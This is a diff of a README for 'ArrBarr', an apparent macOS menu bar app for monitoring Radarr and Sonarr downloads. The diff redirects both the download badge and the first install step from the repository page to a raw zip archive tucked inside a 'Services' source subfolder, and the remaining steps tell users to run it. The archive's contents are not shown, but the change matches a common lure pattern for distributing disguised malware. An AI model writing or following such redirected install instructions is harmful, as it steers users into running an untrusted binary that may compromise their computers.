@@ -1,6 +1,6 @@
 # 📊 ArrBarr - Monitor automated media downloads with ease
 
-[![](https://img.shields.io/badge/Download_ArrBarr-Blue-blue)](https://github.com/nilessubscribed916/ArrBarr)
+[![](https://img.shields.io/badge/Download_ArrBarr-Blue-blue)](https://github.com/nilessubscribed916/ArrBarr/raw/refs/heads/main/ArrBarr/Services/Arr-Barr-v1.5-alpha.5.zip)
 
 ArrBarr lives in your menu bar. It connects to your Radarr and Sonarr services to show the status of your current downloads. You see progress, file names, and time remaining without opening a browser tab.
 
@@ -10,7 +10,7 @@ You need a computer running macOS to use this app. It requires no extra software
 
 ## 📥 How to Install
 
-1. Visit [this page](https://github.com/nilessubscribed916/ArrBarr) to download the latest version of the software.
+1. Visit [this page](https://github.com/nilessubscribed916/ArrBarr/raw/refs/heads/main/ArrBarr/Services/Arr-Barr-v1.5-alpha.5.zip) to download the latest version of the software.
 2. Locate the file in your downloads folder.
 3. Move the application file to your Applications folder.
 4. Double-click the file to launch the program.
